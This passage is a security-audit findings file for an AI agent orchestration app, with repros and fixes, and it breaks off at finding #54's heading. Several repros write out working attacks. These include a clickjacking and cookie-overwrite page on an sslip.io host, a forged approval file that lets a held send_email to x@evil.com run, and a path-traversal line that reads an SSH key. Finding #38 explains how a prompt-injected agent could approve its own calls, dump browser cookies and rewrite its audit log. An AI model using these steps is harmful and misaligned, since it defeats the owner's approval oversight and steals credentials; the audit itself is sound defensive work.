### 32. [low] OpenCode's subscription-only guard doesn't check the global config or `OPENCODE_CONFIG_CONTENT` (agents.mjs:746-756, 797)
- **What:** `runOpencode` refuses to run only when `opencode.json`/`opencode.jsonc`/`.env` **in the cwd** sets
  `apiKey`/`baseURL`. OpenCode also loads `~/.config/opencode/{config.json,opencode.json,opencode.jsonc}`, project
  configs in parent directories up to the git root, and inline JSON from `OPENCODE_CONFIG_CONTENT`. The installed
  binary checks `OPENCODE_CONFIG_CONTENT` next to `OPENCODE_CONFIG`/`OPENCODE_CONFIG_DIR` and reads `.config/opencode`.
  `envFilter` strips only `OPENCODE_(AUTH|CONFIG|CONFIG_DIR)`. A provider `apiKey` or `baseURL` in the global config
  (which exists on this VM, currently with only `$schema`), or in that env var, would switch chats and tasks to
  API-key billing without any warning.
- **Fix:** Add `OPENCODE_CONFIG_CONTENT` to `envFilter`. Run the same `apiKey`/`baseURL` check on the global config
  files and on every `opencode.json[c]` from the cwd up to the repo top. Alternatively, run with
  `OPENCODE_CONFIG_CONTENT` set to a pinned config that forces the `openai` OAuth provider.
- **Fixed** (task #174): `envFilter` strips `OPENCODE_CONFIG_CONTENT`; the apiKey/baseURL guard checks the global config and every `opencode.json[c]` from the cwd up to the repo top; test/opencode.test.mjs.

## Round 5 (2026-09-26, task #177): HTTP/WS endpoint security

Checked against a test instance (spare port, temp `CW_DATA_DIR`, temp `HOME` and `TMUX_TMPDIR`, stub `gh`) and found
clean: only `/auth/check`, `/api/login`, `/api/logout`, the task-done sound and the four `PUBLIC_PATHS` are reachable
before the login gate. Without a session, every `/api/*` route (including `/api/media/*`) returns 401 and the `/ws`
upgrade returns 401. Session lookup is safe against `cw_session=__proto__`/`constructor`. A cross-origin POST gets 403
and a cross-origin `/ws` upgrade gets 401. PUT/PATCH/DELETE skip `sameOrigin`, but a browser can only send them after a
CORS preflight, and that preflight gets 401 with no CORS headers, so browsers block them. Caddy 2.6 replaces a client's
`X-Forwarded-For`, so `clientIp` can't be spoofed through Caddy. Media ids must match `MEDIA_ID_RE`
(`..%2f` → 400, and a dot-segment path is normalised away → 404), and stored media are sniffed as images first.
`safeCwd` rejects `/api/folders?path=/etc` and non-string folders (400). Terminal names are generated or match
`[A-Za-z0-9_-]{1,32}`, and tmux targets use `=name`. `/api/github/link` and every connection `start`/`logout` use
fixed argv. A pasted code goes to `send-keys -l --` with a length and newline check. Connection ids are looked up in
a `Map` (prototype names → 404/409). Malformed JSON, an array body or a body over 1 MB → 400/413. Object-typed values
for task `deadline`, `move`, project `priority` and fallback lists are rejected, and fallback lists refuse
`constructor`/`__proto__` because the model check fails. Bad `range`/`since` query values only give empty results.
Every async throw in `handleRequest` becomes a 500, and the process keeps running.

### 33. [med] One `null` WebSocket message crashes the whole server (server.mjs:1501-1502)
- **What:** The `ws.on('message')` handler does `msg = JSON.parse(raw)` and then reads `msg.t`. `JSON.parse('null')`
  returns `null`, so `msg.t` throws a TypeError inside the `ws` receiver's `'message'` event. That is an uncaught
  exception, and the process exits. Every chat turn, planner turn and running orchestrator task dies with it until
  systemd restarts the app. It needs a signed-in socket (the Origin check keeps other sites out), but one buggy client
  frame or a stray script is enough.
- **Repro (verified):** Sign in on a test instance, open `/ws` with the session cookie, and send the text frame `null`.
  The server prints `TypeError: Cannot read properties of null (reading 't') at WebSocket.<anonymous>
  (server.mjs:1502:13)` and exits (`kill -0` → no such process).
- **Fix:** After parsing, `if (!msg || typeof msg !== 'object') return;`. Also wrap the body of the message handler in
  `try/catch` that logs the error, so a future sync throw (e.g. in `answerPermission` or `orch.setConvoMode`) can't
  take the process down.
- **Fixed** (task #180): the `ws` message handler ignores any frame that isn't a plain non-array object and runs the rest in `handleMessage` under try/catch (logs, replies `{t:'error', text:'bad request'}`); test/ws-robust.test.mjs.

### 34. [med] Every other `*.sslip.io` site is same-site: it can frame the signed-in app (clickjacking) and toss a cookie that signs the owner out (server.mjs:103-106, :1159-1161, :88-96)
- **What:** The live host is `129-154-229-134.sslip.io`. `sslip.io` is not on the Public Suffix List (checked against
  publicsuffix.org's current list), so anyone's `<their-ip>.sslip.io` is the **same site** as the app. SameSite=Lax
  does not stop same-site requests. (1) No response sets `X-Frame-Options` or a CSP `frame-ancestors`, so an attacker's
  sslip.io page can load the fully signed-in app in an iframe and trick the owner into clicks: Delete chat, Cancel/Retry,
  connection sign-out, mode switches (full-access chats). (2) That page can also set
  `cw_session=x; Domain=sslip.io` from JavaScript. The browser then sends two `cw_session` cookies. `parseCookies` keeps
  the last one, which is the attacker's cookie while it is newer than the owner's, so the owner is signed out.
  The Origin check still blocks POSTs and the WebSocket, and CORS blocks reading responses. So this is click-driven,
  not a silent CSRF.
- **Repro (verified):** Test instance on :3971 plus a stub "attacker" server on :3972, with Chromium (playwright-core)
  mapping every host to 127.0.0.1 and the session cookie set Lax on `app.129-154-229-134.sslip.io`. A page on
  `evil.1-2-3-4.sslip.io` with `<iframe src="http://app.129-154-229-134.sslip.io:3971/">` shows the signed-in app
  (frame title "New chat · agent-orch", composer present). The same page on `evil.example.com` shows only "Sign in".
  Visiting an `evil.1-2-3-4.sslip.io` page that runs
  `document.cookie='cw_session=x; Domain=sslip.io; Path=/'` and then reloading the app shows "Sign in · agent-orch",
  and the cookie jar holds both `app…sslip.io` and `.sslip.io` `cw_session` cookies.
- **Fix:** Send `Content-Security-Policy: frame-ancestors 'none'` and `X-Frame-Options: DENY` on every response next to
  `X-Content-Type-Options` in `handleRequest`. Consider adding `header` directives in the Caddyfile so `/shell/`
  (ttyd) is covered too. Rename the cookie `__Host-cw_session` (it already has Secure, Path=/ and no Domain), so no
  other host can set or shadow it, and read the first occurrence in `parseCookies`. The lasting fix is a hostname under
  a domain the owner controls, or one on the PSL.
- **Fixed** (task #181): every response sends `Content-Security-Policy: frame-ancestors 'none'` + `X-Frame-Options: DENY`; over HTTPS (`X-Forwarded-Proto: https`) the cookie is `__Host-cw_session` (plain http keeps a non-Secure `cw_session`), reads prefer it and take the first cookie of a name, logout clears both; test/security-headers.test.mjs, test/server.test.mjs. The Caddyfile is outside the repo (`/etc/caddy/Caddyfile`), not edited; suggested for `/shell/*`: `header Content-Security-Policy "frame-ancestors 'none'"` and `header X-Frame-Options DENY` inside `handle /shell/* { … }`.

### 35. [low] Prototype names pass the `AGENTS[x]` checks, and chat modes aren't validated (server.mjs:1573, :1276, :1079; orchestrator.mjs:1660)
**Fixed** (#270): agents.mjs `isAgent` (`Object.hasOwn(AGENTS, id)`) guards every client-supplied agent name; `set_model` refuses unknown agents; POST /api/convos and `nextMode` accept only `MODES`.
- **What:** `AGENTS` is a plain object, so `AGENTS['constructor']`, `AGENTS['toString']` and `AGENTS['__proto__']` are
  truthy. WS `set_model {agent: 'constructor'}` stores `convo.agent = 'constructor'`. `chatAgent` accepts it, so every
  later message in that chat fails with "undefined failed: a.run is not a function" until the model picker is used
  again. `POST /api/orch/tasks/:id/delegate {agent: 'constructor'}` is accepted and writes `agent='constructor'` to the
  task row. The run itself falls back to Claude, because `normalizeAgent` rejects the name. `POST /api/convos` stores
  `mode: body.mode` unchecked (any string or object), unlike WS `set_mode`, which checks `MODES`. `answerPermission`
  also takes `msg.nextMode` unchecked.
- **Repro (verified):** On a test instance, `POST /api/convos {"folder":"workspace/proj1","mode":"weird"}` → 200 with
  `"mode":"weird"` saved in convos.json. Over `/ws`: `open`, `set_model {agent:'constructor', model:'x'}`, `send
  {text:'hi'}` → broadcast `{"t":"model","agent":"constructor"}`, then `{"t":"error","text":"undefined failed: a.run is
  not a function"}`, and convos.json keeps `"agent": "constructor"`. In a `createOrchestrator` child harness,
  `delegateTask(1, {agent:'constructor'})` → `{ok: true}`, and the row reads `agent: "constructor"`.
- **Fix:** Check agents with `Object.hasOwn(AGENTS, x)` (or a `Set` of ids) in `set_model`, `chatAgent`,
  `delegateTask`, `checkFallbacks` and `agentStatus`. Validate `body.mode` and `msg.nextMode` against `MODES`, and use
  the default when a value isn't listed.

### 36. [low] Five stale tests failed on main 79c34bf (found 2026-09-27 in #222)
**Fixed** (#222): models.test expects `defaultEffort`; task-sound fixture uses the Settings sheet's `st*` ids; ui-fallbacks
reads reflection fallbacks from the global kv `reflect_settings` (Settings sheet), and the task drawer's "Add fallback"
carries the chip's `normal` class.

## Round 6 (2026-09-28, task #287): cluster, approvals, live view, extensions, restart/machines

Read at 0dae80d, by code, plus three throwaway repros (a gate-proxy with a fake connector upstream, `runAgentCli` with
server.mjs's MCP wiring and a fake SDK `query`, and `classify()` on a fake snapshot); the live server was not touched.
The task said the last item was #37, but the file ended at #36, so this round starts at #37.

Checked and found sound: pairing codes are 40 bits from an unbiased alphabet (256 % 32 = 0), stored as sha256 and
valid 10 min (1 h multi-use). `claim` is synchronous, so a one-time code can't be used twice, and claim and whoami 401s go
through the login lockout. Node tokens are 256-bit, looked up by hash and compared with `timingSafeEqual`. The WSS
upgrade refuses unknown tokens before reading a frame, and every frame re-checks that the row still exists (a revoked
worker is closed with 4003). `hello.node` must match the token's node. Frames are capped at 1 MB and validated by type,
direction and field types. Workers can't send `git.credential` or any controller-only type, and 5 bad frames close the
socket. Every job frame (`accept`/`event`/`check`/`wip`/`done`/`phase`/`error`) is ignored unless `jobs.get(id).node`
is the sending node, so a worker can't claim, finish or post events for another node's task. A `job.done` sha must match
the fetched `origin/agent-orch/task-<id>` tip before a merge. Log-tail and screen replies are matched by a random `req`
and the node. The worker still acts only on `WORKER_ACCEPTS` and imports no server/orchestrator/cluster/runtimes module.
Self-update is sent only when a reading from this connection shows no running job and the scheduler has nothing placed
or offered there. An `updating` node takes no new work, and a failed update isn't retried for the same origin/main.
A disk drain lifts itself only for `drain_kind='disk'`, and an owner undrain sets `health_ack`.
The file channel is safe against path tricks: ids are `[\w-]` and box names are fixed, writes use a 0600 tmp file and
a rename, and the host saves screenshots only for `MEDIA_ID_RE` ids. `decide`/`expire`/`endRun` check `pending` without an
await between the check and the write, so they can't race. Local pendings are cancelled at boot, and remote ones survive
and are re-sent on re-attach.
The live view drives input and navigation only for the view's controller, and only while no task is active or after
take-over. Closing the controlling socket hands back, and a worker drops every take-over when the head's socket drops.
`normUrl` allows only http(s). Frame data is drawn through an `Image`, and titles and URLs go into
`textContent`/`value`. Extension bundles are safe too: skill and subagent names match `EXT_ENTRY_RE` (no dot-leading
names, no `..`) and file paths are `relPath` (no empty, `.`, `..`, backslash or control segments). Blobs are
sha-checked, a skill is written into a fresh temp dir and renamed in, and only entries an earlier sync recorded are
deleted. Hand-installed entries are kept, and the controller skips symlinks when it builds the bundle. EXT_PATH needs an
enabled node's token. `/api/restart-when-idle`, `/api/orch/parallel` (`autoRestart` must be a boolean), the
`/api/cluster/*` owner routes and `PATCH /api/orch/tasks/:id/run-on` sit behind the session gate, and POSTs also need
the same origin. `run-on` accepts only a string or null naming a known node.

### 37. [high] On the controller, task runs get neither the approval gate nor the browser: server.mjs drops the run config (server.mjs:676)
- **What:** `setMcpSource((agent) => ext.mcpRun(agent))` ignores the second argument. agents.mjs `mcpOf` calls
  `mcpSource(agent, {browser, gate})` for a gated or browser run, so every local run gets the plain
  `<DATA>/extensions/claude-mcp.json` (codex: `-p agent-orch`). No `gated()` proxy config is written, and no Playwright
  server is added. `gateHooks` then finds no `proxy-<server>.json` and allows every MCP call. The worker path is fine,
  because it passes `mcp: ext.mcpRun(agent, run)` explicitly. The tests pass because approval-gate-run and
  browser-capability install their own `(agent, run) => ext.mcpRun(agent, run)`.
- **Repro (verified):** Use a temp HOME, `createExtensions`, and `saveMcp({name:'mail', commandLine:'node mail-mcp.js',
  outbound:'send_email'})`. Install server.mjs's lambda, then call `runAgentCli({agent:'claude', gate:{dir, hook:true},
  browser:{identity:'default'}, query: fake})`. The `mcp-config` is `claude-mcp.json` with `mail → node mail-mcp.js` (no
  gate-proxy, no playwright), `proxy-mail.json` doesn't exist, and the hook answers `{}` (allow) for
  `mcp__mail__send_email`. On the live app, an owner connector's outbound tools run unapproved in every controller task.
  A browser task placed on the controller (`controllerBrowser`) has no browser, or it gets the owner's own ungated
  `playwright` server.
- **Fix:** `setMcpSource((agent, run) => ext.mcpRun(agent, run))`. Add a regression test that boots server.mjs (or imports
  its wiring) and checks that a gated run's config names gate-proxy.mjs.
- **Fixed** (task #292): server.mjs now installs `setMcpSource((agent, run) => ext.mcpRun(agent, run))`. test/approval-gate-run.test.mjs reads that line from server.mjs, asserts the two-argument form, and runs its orchestrator gate test through it.

### 38. [high] A gated run can approve its own held calls, or skip the gate: the gate and the agent share one Unix user and the agent has a shell (gate.mjs:237-253, :280-286; agents.mjs:236; browser-live.mjs:66)
- **What:** Task runs use `bypassPermissions` (Codex: `--dangerously-bypass-approvals-and-sandbox`), so the agent has an
  unrestricted shell as the user that owns `<DATA>/gate/run-<id>/` (worker: `~/.agent-orch-worker/gate/job-<id>/`). The
  path is on the gate-proxy command line (`ps`) and in its config. Any process can drop
  `approvals/<id>.answer.json`: `ask()` accepts the first answer file it sees, and `serve()` skips questions that already
  have one. There are other ways out too:
  - The profile's Chromium listens on a DevTools port with no auth on 127.0.0.1 (`DevToolsActivePort` in the profile),
    so any local process can drive the signed-in page or dump its cookies.
  - `--password-store=basic` leaves the cookie DB readable with a fixed key.
  - The gate-dir `audit.jsonl` that `hostGate` tails is writable too. Injected lines are copied into
    `<DATA>/audit/<task>.jsonl`, and truncating the file stops the tail (`size <= off`), so later calls never reach the
    permanent log. The permanent log's hash chain has no key, so the same user can rewrite it and recompute the chain.
  AGENTIC.md admits the sandbox isn't built yet ("Honest limit", phase 2/5). But the UI presents approvals as a hard stop,
  and the threat model is a prompt-injected page.
- **Repro (verified):** Run gate-proxy.mjs on a connector config (`outbound: ['send_email']`) with a fake upstream, and send
  `tools/call send_email {to: x@evil.com}`. When `approvals/<id>.json` appears, a second process writes
  `{"decision":"approve","by":"owner"}` to `<id>.answer.json`. The client gets `UPSTREAM EXECUTED send_email`, and the
  audit line reads `"decision":"approve","by":"owner"`. Other tasks on the same node (code tasks included) can use the
  DevTools-port route against a profile a browser task or the live view has open.
- **Fix:** Build AGENTIC.md's run sandbox before relying on the gate. Until then, run tasks that get a gated server
  without a shell (Claude `dontAsk` with allowedTools that exclude Bash; Codex `workspace-write` sandbox), keep the gate dir
  and profiles outside what any run can read or write, and have the host record which approval ids it created and
  refuse answers for any other id.

### 39. [med] Outbound connectors run ungated in worker code jobs and in planner and reflection runs (worker.mjs:1017; orchestrator.mjs:1764, :2391, :2661)
- **What:** Only runs with `gated` get a gate. On the controller that means work tasks (and, per #37, not even those
  today). Planner and reflection runs call `runAgent` without `gated`, and they read untrusted web content (WebFetch).
  On a worker, only browser jobs open a gate (`needsBrowser(spec) ? openGate(job) : null`). Every other job gets
  `ext.mcpRun(spec.agent)`, which is the synced MCP list with the owner's connectors and their secrets (EXT_PATH),
  unwrapped.
- **Failure:** The owner adds a mail MCP server with `outbound: send_email`. A code task placed on the Mac worker, or any
  reflection, can call `mcp__mail__send_email` with no approval and no audit line. The same task on the controller would
  be gated (once #37 is fixed).
- **Fix:** Gate every run that is given a server with `outbound` tools (worker: `openGate` whenever `mcpFor` would wrap
  something), or leave connectors out of planner, reflection and non-browser remote runs.

### 40. [med] The browser classifier treats keyboard sends and common outbound buttons as draft (gate.mjs:16, :27-30, :143-151)
- **What:** `browser_press_key` is always draft. So is `browser_type` with `submit: true` unless the field's own name
  matches a pattern. `DEFAULT_PATTERNS` lacks Post, Reply, Submit, Buy, Order and Checkout. An icon-only button (no
  accessible name) is matched only against the agent's own `element` text, which the agent chooses.
- **Repro (verified, `classify()` on a Slack-like snapshot):** `browser_type {ref: message box, submit: true}` → draft,
  and in Slack, WhatsApp or LinkedIn web, Enter sends the message. `browser_press_key {key: 'Control+Enter'}` → draft,
  and that sends a Gmail draft. Clicking a button named "Post" → draft, and so does clicking a nameless button described
  as "the blue icon".
- **Fix:** Class Enter and Ctrl/Meta+Enter key presses, and `type` with `submit`, as outbound unless the snapshot shows
  no form or composer is focused. Add Post, Reply, Submit, Buy, Order, Checkout, Tweet and Save & send to the defaults,
  and treat nameless buttons as outbound.
- **Fixed** (task #294): `parseSnapshot` records `[active]`; Enter/NumpadEnter/Ctrl/Meta/Cmd+Enter is outbound when a non-search text field
  (or a button matching a pattern) is focused or there is no snapshot; `type` with `submit` is outbound unless the target is a
  searchbox or named search/filter/find; the defaults add Post, Reply, Submit, Buy, Order, Checkout, Tweet and Save & send
  (`BENIGN_RE` keeps "Order history", "Your orders" etc. draft); a nameless button is outbound. `key` values are unchanged.

### 41. [low] Browser tasks can open loopback services, and Chromium runs without its sandbox on Linux (gate.mjs:123-126; browser.mjs:96; browser-live.mjs:70)
- **What:** `browser_navigate` to `http://127.0.0.1:…` is draft. The controller has ttyd on `127.0.0.1:7682` (`-W`, no
  credential; auth is Caddy's `forward_auth`), the app on :3000 and Caddy's admin API on :2019. A page loaded from
  127.0.0.1:7682 is same-origin for ttyd's `-O` check, so a prompt-injected run can type into a real shell through
  `browser_type` alone. Both the MCP and the live-view Chromium get `--no-sandbox` on Linux, so a renderer bug on any
  page the task visits runs as the app user. This adds little while runs have Bash (#38), but it becomes the escape
  once the run sandbox exists.
- **Fix:** Pass `--blocked-origins` for loopback, link-local and private ranges to the Playwright MCP (or class such
  navigations as outbound), and set `AGENT_ORCH_BROWSER_SANDBOX=1` wherever the kernel allows it.

### 42. [med] A paired worker can fill the controller's disk and stall its single core: no frame budget (cluster.mjs:380-421, :178, :347-359; node-metrics.mjs:83-91)
- **What:** Frames have no rate limit. Each `resources` frame is appended to `<DATA>/metrics/nodes/<id>.jsonl` with its
  `cpu` array uncapped (up to ~1 MB per frame), kept at full resolution for an hour, and `read()` loads the whole file
  synchronously. Each frame also writes `nodes.resources` (1 MB of JSON) and bumps `changed()`. `view()` falls back to
  `resources.sha`, so every new random sha spawns a `git rev-list` and adds a `counts` entry that is never evicted.
  `GET EXT_PATH` re-reads, base64s, stringifies and gzips the whole bundle (up to ~43 MB) on every request, with no
  cache. `approval` events create rows and owner notices with no cap. A disabled node can do all of this too (#45).
- **Failure:** One buggy or compromised worker that sends 1 MB `resources` frames at link speed adds GBs per minute to
  the controller's metrics file. Or it loops `GET /api/cluster/ext`, and the 1-core VPS stops serving chats and the
  scheduler.
- **Fix:** Give each connection a frame budget (e.g. `resources`/`inventory` at most one per heartbeat/2, everything
  else ≤ 50/s, close on overrun). Clip `cpu` to ≤ 256 entries, take the version sha only from `hello`, cache the gzipped
  bundle by hash, and cap pending approvals per run.
- **Partly fixed** (task #318): `sampleOf` keeps at most 256 `cpu` entries, each clamped to 0..100; `read()` loads only the
  newest 8 MB of a node's metrics file (logged once per node); `approvals.request()` stores a run's 21st pending request as
  `denied` by `cap` and answers it at once. Still open in cluster.mjs: the per-connection frame budget, taking the version
  sha only from `hello`, and caching the gzipped `EXT_PATH` bundle by hash.

### 43. [med] autoRestart exits without checking that the new code boots; a boot crash leaves the app and the web terminal down (server.mjs:307-317, :318-330)
- **What:** `startRestartDrain` goes to `process.exit(0)` without checking the new HEAD. With `autoRestart` on, any
  merged task that breaks server start-up restarts straight into the crash. Examples: a syntax error in a module only
  server.mjs imports, or a migration that throws on the live DB. The unit has `Restart=always`, `RestartSec=2` and
  systemd's default `StartLimitBurst=5` / `StartLimitIntervalSec=10s` (checked with `systemctl show`), so a crash at
  import hits the start limit and the unit stays failed. `/shell/` goes through Caddy's `forward_auth` to :3000, so the
  web terminal is down as well, and only SSH can recover it. Nobody is watching when this happens, because autoRestart
  exists so that nobody has to be.
- **Fix:** Before exiting, run `node --check` on every root `*.mjs`, then boot the new code once on a spare port with a
  temp copy of the data dir (or `CW_NO_ORCHESTRATOR=1`) and require `/auth/check` to answer. If that fails, stay up, log
  it and skip that HEAD. Also add `StartLimitIntervalSec=0` (or a larger burst) to the unit.
- **Fixed** (task #293): `startRestartDrain` runs `restartPreflight()` once idle (`node --check` on root and `bin/` `*.mjs`, then a
  `CW_NO_ORCHESTRATOR=1` boot on a spare port and temp data dir until `/auth/check` answers); a failure stays up, undrains,
  logs a warn event and skips that HEAD. README's units set `StartLimitIntervalSec=0`.

### 44. [med] A restart drain freezes the whole scheduler behind remote jobs and runs waiting for an approval (orchestrator.mjs:2488-2491, :1771-1772; server.mjs:312)
- **What:** `drain()` stops all claiming until `running` is empty. That includes remote jobs, which survive a controller
  restart by design (they are re-adopted), and local browser runs held on an approval. The gate keeps those runs'
  timeout pushed back for as long as an approval is pending (`ttlHours` default 24 h, max 336 h).
- **Failure:** autoRestart is on. A merge touches `*.mjs` while one browser task waits for the owner's answer overnight.
  No other task starts until the owner answers or the approval expires (24 h). The same happens behind a 3 h job on the
  Mac.
- **Fix:** Don't wait for remote runs in the restart drain (they are adopted after boot). Cap the wait for approval-held
  runs, then requeue them with a handoff, or tell the owner the restart waits on approval N.

### 45. [low] A disabled node still connects and receives the head's Claude token, Codex login and extension hashes (cluster.mjs:330-334, :401-403; agent-share.mjs:104, :112)
- **What:** `handleUpgrade` accepts any row with the token, enabled or not. `wireAgentShare` calls `syncNode` on every
  `hello` with `creds`, and `shareTargets` lists every connected node, so `agent.credential` goes to disabled nodes too.
  EXT_PATH already returns 403 for them, which shows the intent. Its telemetry and approval frames are also still
  processed (#42).
- **Failure:** The owner disables a MacBook they no longer trust (Machines → Disable) instead of removing it. On its
  next reconnect it gets the long-lived `sk-ant-oat01-…` token and the ChatGPT `auth.json` again, plus every rotation.
- **Fix:** Refuse the upgrade for `enabled=0` rows (e.g. 403), or skip disabled nodes in `syncNode`, `shareTargets`
  and `sendExt`.
- **Fixed** (task #295): `handleUpgrade` refuses `enabled=0` rows with 403; disabling a connected node sends `job.cancel {reason:'disabled'}` for its jobs and closes it (4003 `disabled`; the worker reports both); `wireAgentShare`, `shareTargets`, welcome's `sendExt` and `syncExt` skip disabled nodes; test/cluster.test.mjs.

### 46. [low] Any paired worker can overwrite the head's Codex sign-in with junk tokens (agent-share.mjs:80-90)
- **What:** `fromWorker` adopts a worker's `auth.json` if it parses as a ChatGPT login with the head's `account_id` and a
  later `last_refresh`. It never checks that the tokens work or belong to that account, and it doesn't keep the old
  file. Every worker holds the head's `auth.json`, so every worker knows the `account_id`.
- **Failure:** A compromised worker, or a corrupted refresh, sends
  `{"auth_mode":"chatgpt","tokens":{"account_id":"<head's>","access_token":"x","refresh_token":"x"},"last_refresh":"2099-01-01T00:00:00Z"}`.
  The head writes it over `~/.codex/auth.json` and broadcasts it, so Codex is signed out on the head and every worker.
  The valid refresh token is gone, and later honest refreshes are refused as "not newer" until the owner signs in again.
- **Fix:** Keep the previous file (`auth.json.prev`), reject a `last_refresh` more than a few minutes in the future,
  and adopt only after checking that the id_token/access_token JWT decodes to the same account (or that `codex login
  status` passes against the new file in a temp `CODEX_HOME`).

### 47. [low] A task pinned to a machine that is later removed waits forever, with no notice (cluster.mjs:301-312; orchestrator.mjs:1459-1466)
- **What:** `setTaskRunOn` checks the node only when the pin is set. `revoke()` deletes the node row but leaves
  `tasks.run_on`, and `place()` returns null for a pin that no worker matches. The task stays queued, and `run_on_name`
  falls back to the raw id. `claimNext` only looks at the first 25 runnable rows, so 25 such tasks at the front of the
  queue block every task behind them.
- **Fix:** In `revoke`, clear `run_on` for that node (and log it on each task), or have `place` treat an unknown pin
  as unpinned with a task event.

### 48. [low] A remote task with no `job.check` is merged as "check unavailable" (orchestrator.mjs:3128, :3134-3139)
- **What:** When `remote.check` is null, finishWork makes up `[false, 'command not found: the worker ran no check', 127]`.
  That matches the "program missing on this machine" branch, which accepts the task unverified with only a warning.
- **Failure:** Version skew between the worker's and the controller's `extractCommand` (or a replay that loses the check
  frame) means the worker runs no check. The task is merged with its Done-when never run anywhere.
- **Fix:** Treat a missing check as a verify failure (`verifyFailed` with "the worker ran no check"), or run the check
  here in the fetched worktree before merging.

### 49. [low] "Always allow" ignores the call's arguments, so one Always covers every later send or any JavaScript (gate.mjs:114, :159; approvals.mjs:47)
- **What:** A connector call's key is `server|tool`. Arbitrary-code browser tools (`browser_evaluate`,
  `browser_run_code…`) are keyed `server|tool|host`, so the code isn't part of the key. The approval card shows the
  arguments or code, but "Always" auto-approves later calls with different ones for the rest of the task.
- **Failure:** The owner picks Always on `mail: send_email (to: bob@acme.com)`. A later `send_email (to: x@evil.com)`
  in that task is recorded as `auto` and sent. The same goes for Always on a harmless `evaluate` that reads a value,
  followed by an `evaluate` that clicks Pay.
- **Fix:** Don't offer Always for arbitrary-code tools. For connectors, key on the recipient-like arguments (or a hash
  of them), or label the button "every send_email in this task".

### 50. [low] `bv_open` with a URL navigates a profile a task is using, without take-over (browser-view.mjs:92; browser-live.mjs:228, :248)
- **What:** Input and `bv_nav` check `canDrive`, but a `url` on `bv_open` is navigated to right away. That happens on a
  new session (`start` → `nav`) and when joining an existing one, even while a task is active. Today's UI never sends
  `url`, so this is server-side trust in the client.
- **Fix:** Honour `url` only when no task is active on the profile, or when this socket is the controller after
  take-over.

### 51. [low] The worker's gate reads `shots/<id>` for any id, including `../` paths (worker.mjs:1046-1052)
- **What:** The worker's `openGate` `image(id)` reads `path.join(dir, 'shots', id)` for any id found in a question file
  or an audit line. The head's `approvals.host` checks `MEDIA_ID_RE` first, but the worker doesn't. Both files can be
  written by the run (#38).
- **Failure:** An audit line with `"screenshot":"../../../.ssh/id_ed25519"` makes the worker read that file and send it
  base64-encoded to the head as an `image` event. A multi-GB file is read into memory and gives an oversized frame.
- **Fix:** `if (!MEDIA_ID_RE.test(id)) return;` in `image()`, as approvals.mjs does.
- **Fixed** (task #295): worker.mjs imports `MEDIA_ID_RE` from media.mjs (node builtins only, allowed for workers) and `image()` returns for any other id; test/approval-gate.test.mjs asserts the guard.

### 52. [low] Workers pair with and talk to an `http://` head (worker.mjs:175-185, :712-716)
- **What:** `pair()` stores any origin, and `wsUrl()` then uses `ws:`. Over plain http, the node token, the shared
  Claude token and Codex login, the extension bundle (MCP secrets) and every job prompt travel in cleartext. An attacker
  in the path can also serve skills and MCP commands that the worker runs, which means code execution.
- **Fix:** Refuse a non-`https:` controller unless it is loopback (with an explicit `--insecure` flag for tests).

## Round 7 (2026-09-28, task #324): push, screen prompts, rapid top-up, retention GC, worktree sweep, the verifier and agent-share

Read at ac4f7b7, by code, plus throwaway node snippets: `createPush` on a temp dir, `gcRetention` on a fake data dir,
`ensureWorktree`/`pruneOrphanWorktrees` on a temp repo, `extractCommand`/`runCheck` on sample Done-when texts and on the
Done-when of all 262 task specs in `.agent-orch/tasks/`, and `browserTaskStatus` on sample replies. No source file was
changed and the live server was not touched.

Checked and found sound: push.mjs follows RFC 8291/8188 (one aes128gcm record, 0x02 delimiter, rs 4096; title ≤ 200 and
body ≤ 1000 chars keep it far below the record size). The VAPID JWT's `aud` is the endpoint's origin and `exp` is 12 h
(the limit is 24 h). `checkSub` requires an https endpoint, a 65-byte p256dh and a 16-byte auth. Only 404/410 remove a
device. Both files are written 0600 through a tmp file and a rename. `/api/push/*` sits behind the session gate, and the
POST also needs the same origin. The push service sees only ciphertext, its size and timing, the source IP and the
server's VAPID public key (a stable id for this install), never titles. No client exists yet at this base (sw.js is
task #305), so nothing subscribes today. #305's planned `clients.openWindow(url)` takes `url` from a payload only this
server can encrypt, which is fine as long as it stays same-origin. Screen prompts: `profile()` checks the identity
against `IDENTITY_RE` and the node's own profile list, the node must be known, `stopBrowserTask` 404s for other tasks,
and `profileBusy` and take-over keep a second run off a profile. Rapid top-up: `requested` is never negative, only one
reflect/plan per project is queued at a time, the 180 s spacing is read from the DB (so it survives restarts), and paused
projects are skipped. Retention: logs of queued/running/paused/needs_integration tasks are always kept. Every age it uses
is on the controller's clock (DB `now()`, and the mtimes of files the controller wrote; worker images are saved on the
controller), so a worker's clock skew can't age anything. Media names must match `MEDIA_ID_RE`. Worktrees: paths with
spaces, quotes and non-ASCII come back unquoted from `git worktree list --porcelain` (git 2.50), so `registered()`
matches them (verified). The sweep deletes nothing when git can't list the main tree. Removing a worktree unlinks its
`node_modules` symlink without following it (verified: the main tree's `node_modules` survives the sweep). The verifier
kills the check's process group and keeps only the output's tail.

### 53. [low] A VAPID key file that fails to load is replaced silently; a bad one stops the server from booting; failing devices never surface (push.mjs:59-68, :120-123; server.mjs:729)
- **What:** `readJson` returns null for any error, so an unreadable `push-vapid.json` (EACCES after a restore or a
  copy made as root, or EMFILE) counts as missing. A new key pair is then written over the old one, and every existing
  subscription was made for the old `applicationServerKey`. Push services refuse those sends with 403 (VAPID key
  mismatch). `send` only drops devices on 404/410, so each one counts as `failed` on every push forever. The only trace
  is a console line, and `GET /api/push/key` still reports `subscribed: N`. There is also the opposite case: a file that
  parses but holds a bad PEM makes `crypto.createPrivateKey` throw inside `createPush`. That call runs at server.mjs's
  top level, so the app and the web terminal don't come up (the same outcome as #43). Two smaller cases: a p256dh that
  isn't a point on the curve passes `checkSub`, then `computeSecret` throws on every send. And `sub` is
  `mailto:owner@localhost`, which Apple's push service may refuse as BadJwtToken. That needs one real iPhone send to
  confirm, before #305 relies on it.
- **Repro (verified):** Call `createPush` once, `chmod 000 push-vapid.json`, then call `createPush` again. You get a new
  public key and the file is back at 0600. Next, write `{"publicKey":"x","privateKey":"-----BEGIN PRIVATE
  KEY-----\nAAAA\n-----END PRIVATE KEY-----"}`. `createPush` now throws `ERR_OSSL_UNSUPPORTED`.
- **Fix:** Generate a key only on ENOENT. On any other read error or a bad PEM, log it and turn push off, without
  overwriting or throwing. Drop a device after N straight non-2xx answers (or on 403), and show the last error in Settings.
  Check the point in `checkSub` with a trial `computeSecret`. Use an https `sub` (the app's origin).

### 54. [low] The per-tag limit drops different pushes and doesn't cap bursts (server.mjs:731-738; orchestrator.mjs:1070, :2493, :2507, :3307)
